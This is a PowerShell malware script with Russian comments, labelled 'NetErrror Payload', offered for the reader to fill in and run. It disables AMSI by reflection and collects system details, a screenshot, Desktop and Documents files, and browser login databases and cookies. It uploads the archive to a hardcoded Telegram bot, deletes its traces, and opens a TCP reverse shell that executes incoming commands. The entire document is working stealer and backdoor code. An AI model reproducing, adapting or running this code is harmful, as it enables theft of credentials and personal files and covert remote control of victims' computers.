# NetErrror Payload – сбор данных + reverse shell
# Заполни свои параметры
$botToken = "8847304224:AAGH8Ax6t43Vzs7Q7jljSAHh7oGUQ2_BnK4"
$chatId = "1870435438"
$attackerIP = "192.168.1.113"   # твой публичный IPv4
$attackerPort = 4444             # любой свободный порт

# Обход AMSI
function Bypass-AMSI {
    $a = [Ref].Assembly.GetTypes()
    foreach ($t in $a) {
        if ($t.Name -eq "AmsiUtils") {
            $f = $t.GetFields('NonPublic,Static')
            foreach ($fi in $f) {
                if ($fi.Name -eq "amsiContext") {
                    $fi.SetValue($null, $null)
                }
            }
        }
    }
}
Bypass-AMSI

# ---- Сбор информации (как в предыдущем скрипте) ----
$sysInfo = @{}
$computer = Get-WmiObject Win32_ComputerSystem
$os = Get-WmiObject Win32_OperatingSystem
$ip = (Get-NetIPAddress -AddressFamily IPv4 | ? { $_.InterfaceAlias -notmatch "Loopback" -and $_.PrefixOrigin -ne "WellKnown" }).IPAddress -join ", "
$sysInfo["ComputerName"] = $computer.Name
$sysInfo["UserName"] = $env:USERNAME
$sysInfo["IP"] = $ip
$sysInfo["OS"] = $os.Caption + " " + $os.Version
$installed = Get-WmiObject Win32_Product | Select Name, Version
$sysInfo["Installed"] = $installed | Out-String

# Скриншот
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
$screenshotPath = "$env:TEMP\screenshot.png"
$bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose(); $bitmap.Dispose()

# Копирование файлов
$tempDir = "$env:TEMP\NetErrrorData"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
Copy-Item -Path "$([Environment]::GetFolderPath('Desktop'))\*" -Destination "$tempDir\Desktop" -Recurse -Force -ErrorAction SilentlyContinue
Copy-Item -Path "$([Environment]::GetFolderPath('MyDocuments'))\*" -Destination "$tempDir\Documents" -Recurse -Force -ErrorAction SilentlyContinue

# Браузеры
$browserPaths = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
    "Firefox"= "$env:APPDATA\Mozilla\Firefox\Profiles"
}
foreach ($b in $browserPaths.Keys) {
    $p = $browserPaths[$b]
    if (Test-Path $p) {
        $d = "$tempDir\Browsers\$b"
        New-Item -ItemType Directory -Path $d -Force | Out-Null
        if ($b -eq "Firefox") {
            Get-ChildItem $p -Directory | % { Copy-Item -Path "$($_.FullName)\*" -Destination "$d\$($_.Name)" -Recurse -Force -ErrorAction SilentlyContinue }
        } else {
            @("Login Data","Cookies","Web Data","Local State") | % { 
                $s = "$p\$_"; if (Test-Path $s) { Copy-Item -Path $s -Destination "$d\" -Force -ErrorAction SilentlyContinue }
            }
        }
    }
}

$sysInfo | Export-Clixml -Path "$tempDir\SystemInfo.xml"

# ZIP
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipPath = "$env:TEMP\data.zip"
[System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)

# Отправка в Telegram
$url = "https://api.telegram.org/bot$botToken/sendDocument"
$wc = New-Object System.Net.WebClient
$boundary = "---------------------------" + (Get-Random -Max 99999999)
$fileBytes = [IO.File]::ReadAllBytes($zipPath)
$body = [Text.Encoding]::ASCII.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$chatId`r`n--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"data.zip`"`r`nContent-Type: application/zip`r`n`r`n") + $fileBytes + [Text.Encoding]::ASCII.GetBytes("`r`n--$boundary--`r`n")
$wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
$wc.UploadData($url, "POST", $body) | Out-Null

# Очистка
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# ---- Reverse Shell (TCP) ----
$client = New-Object System.Net.Sockets.TCPClient($attackerIP, $attackerPort)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.WriteLine("[+] Connected to $env:COMPUTERNAME")
$writer.Flush()
while ($client.Connected) {
    if ($stream.DataAvailable) {
        $cmd = $reader.ReadLine()
        if ($cmd -eq "exit") { break }
        $output = iex $cmd 2>&1 | Out-String
        $writer.WriteLine($output)
        $writer.Flush()
    }
    Start-Sleep -Milliseconds 100
}
$client.Close()
